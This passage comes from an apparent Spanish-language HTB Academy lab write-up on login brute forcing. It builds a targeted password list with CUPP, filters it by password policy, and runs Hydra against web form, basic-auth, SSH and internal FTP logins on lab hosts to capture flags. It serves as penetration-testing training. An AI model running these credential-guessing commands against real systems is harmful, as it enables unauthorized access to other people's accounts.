+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Saving</span><span class="w"> </span><span class="k">dictionary</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">jane</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span><span class="w"> </span><span class="n">counting</span><span class="w"> </span><span class="mi">54478</span><span class="w"> </span><span class="n">words</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Now</span><span class="w"> </span><span class="k">load</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">pistolero</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">jane</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">shoot</span><span class="err">!</span><span class="w"> </span><span class="n">Good</span><span class="w"> </span><span class="n">luck</span><span class="err">!</span><span class="w"></span>
+</code></pre></div>
+
+<p>Esto nos genera un diccionario de 54477 líneas.</p>
+<h3>Password Policy</h3>
+<p>Por otro lado, se nos brinda la política de contraseñas, la cual comprende:</p>
+<ul>
+<li>Minimum Length: 6 characters</li>
+<li>Include at least one uppercase letter</li>
+<li>Include at least one lowercase letter</li>
+<li>Include at least one number</li>
+<li>Include at least two special characters (from the set !@#$%^&amp;*)</li>
+</ul>
+<p>Filtraremos el contenido del diccionario generado por CUPP para solo quedarnos con las contraseñas que cumplan esta política de seguridad y guardaremos el output en un nuevo diccionario:</p>
+<div class="highlight"><pre><span></span><code>grep -E <span class="s1">&#39;^.{6,}$&#39;</span> jane.txt <span class="p">|</span> grep -E <span class="s1">&#39;[A-Z]&#39;</span> <span class="p">|</span> grep -E <span class="s1">&#39;[a-z]&#39;</span> <span class="p">|</span> grep -E <span class="s1">&#39;[0-9]&#39;</span> <span class="p">|</span> grep -E <span class="s1">&#39;([!@#$%^&amp;*].*){2,}&#39;</span> &gt; jane-filtered.txt
+</code></pre></div>
+
+<p>La cantidad de líneas se redujo a 8604.</p>
+<h3>Brute Force</h3>
+<p>Ahora si, utilizaremos los diccionarios customizados de usuarios y contraseñas para realizar un ataque de fuerza bruta al panel de login del sitio:</p>
+<div class="highlight"><pre><span></span><code>hydra -L jane_smith_usernames.txt -P jane-filtered.txt <span class="m">94</span>.237.58.249 -s <span class="m">43711</span> -f http-post-form <span class="s2">&quot;/:username=^USER^&amp;password=^PASS^:Invalid credentials&quot;</span>
+</code></pre></div>
+
+<p><img alt="question6" src="images/images_login_brute_forcing/question6.jpg"></p>
+<p>Nos logueamos y obtenemos la flag.</p>
+<h1>Skills Assessment Part 1</h1>
+<p><strong>Question</strong>: What is the password for the basic auth login?</p>
+<p>Se nos ofrece un sitio que tiene una autenticación HTTP básica. Realizaremos un ataque de fuerza bruta con Hydra para obtener usuario y contraseña: </p>
+<div class="highlight"><pre><span></span><code>hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2023-200_most_used_passwords.txt <span class="m">94</span>.237.63.132 http-get / -s <span class="m">42167</span>
+</code></pre></div>
+
+<p><img alt="skillassessment" src="images/images_login_brute_forcing/skillassessment-1.jpg"></p>
+<p><strong>Question</strong>: After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?</p>
+<p>Al loguearnos, se nos brinda un username que necesitamos para el próximo ejercicio:</p>
+<p><img alt="skillassessment" src="images/images_login_brute_forcing/skillassessment-2.jpg"></p>
+<h1>Skills Assessment Part 2</h1>
+<p><strong>Question</strong>: What is the username of the ftp user you find via brute-forcing?</p>
+<p>Al igual que antes, el puerto 21 no está abierto en el objetivo. Aprovechando que tenemos un usuario válido, intentaremos realizar brute force sobre la IP dada:</p>
+<div class="highlight"><pre><span></span><code>hydra -l satwossh -P /usr/share/SecLists/Passwords/2023-200_most_used_passwords.txt ssh://94.237.63.132:34939
+</code></pre></div>
+
+<p>Obtenemos la contraseña:</p>
+<p><img alt="skillassessment" src="images/images_login_brute_forcing/skillassessment-3.jpg"></p>
+<p>Nos conectamos vía SSH y observamos que internamente el puerto si está abierto:</p>
+<div class="highlight"><pre><span></span><code><span class="n">satwossh</span><span class="nv">@ng</span><span class="o">-</span><span class="mi">1531019</span><span class="o">-</span><span class="n">loginbfsatwo</span><span class="o">-</span><span class="n">obo14</span><span class="o">-</span><span class="mi">7777549</span><span class="n">f94</span><span class="o">-</span><span class="nl">m4994</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="o">-</span><span class="n">tulpn</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">LISTEN</span><span class="w"></span>
+<span class="p">(</span><span class="k">No</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="k">read</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="ss">&quot;-p&quot;</span><span class="err">:</span><span class="w"> </span><span class="n">geteuid</span><span class="p">()</span><span class="o">=</span><span class="mi">1000</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">root</span><span class="p">.)</span><span class="w"></span>
+<span class="n">tcp</span><span class="w">        </span><span class="mi">0</span><span class="w">      </span><span class="mi">0</span><span class="w"> </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">22</span><span class="w">              </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">               </span><span class="n">LISTEN</span><span class="w">      </span><span class="o">-</span><span class="w">                   </span>
+<span class="n">tcp6</span><span class="w">       </span><span class="mi">0</span><span class="w">      </span><span class="mi">0</span><span class="w"> </span><span class="o">::</span><span class="err">:</span><span class="mi">21</span><span class="w">                   </span><span class="o">::</span><span class="err">:</span><span class="o">*</span><span class="w">                    </span><span class="n">LISTEN</span><span class="w">      </span><span class="o">-</span><span class="w">                   </span>
+<span class="n">tcp6</span><span class="w">       </span><span class="mi">0</span><span class="w">      </span><span class="mi">0</span><span class="w"> </span><span class="o">::</span><span class="err">:</span><span class="mi">22</span><span class="w">                   </span><span class="o">::</span><span class="err">:</span><span class="o">*</span><span class="w">                    </span><span class="n">LISTEN</span><span class="w">      </span><span class="o">-</span><span class="w">                   </span>
+</code></pre></div>
+
+<p>Si listamos el contenido vemos tres archivos: IncidentReport.txt, passwords.txt, username-anarchy. El primer archivo nos brinda una pista de que la persona que utiliza FTP es <em>Thomas Smith</em>. Como tenemos en el mismo equipo la herramienta username-anarchy, generaremos una lista de posibles usuarios en base a esto: </p>
+<div class="highlight"><pre><span></span><code>./username-anarchy <span class="s2">&quot;Thomas Smith&quot;</span> &gt; thomas_usernames.txt
+</code></pre></div>
+
+<p>Ahora utilizaremos Hydra con este listado de usuarios y el listado de contraseñas que se nos ofrece: </p>
+<div class="highlight"><pre><span></span><code>hydra -L username-anarchy/thomas_usernames.txt -P passwords.txt ftp://127.0.0.1 
+</code></pre></div>
+
+<p>Obtenemos la contraseña: </p>
+<p><img alt="skillassessment" src="images/images_login_brute_forcing/skillassessment-4.jpg"></p>
+<p>Nos conectamos al servicio FTP y leemos la última flag.</p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-11-25T00:00:00-03:00">lun 25 noviembre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#htb-academy-ref">HTB Academy</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="/tags.html#cpts-ref">CPTS
+                    <span class="superscript">2</span>
+</a></li>
+                <li><a href="/tags.html#offensive-ref">offensive
+                    <span class="superscript">11</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
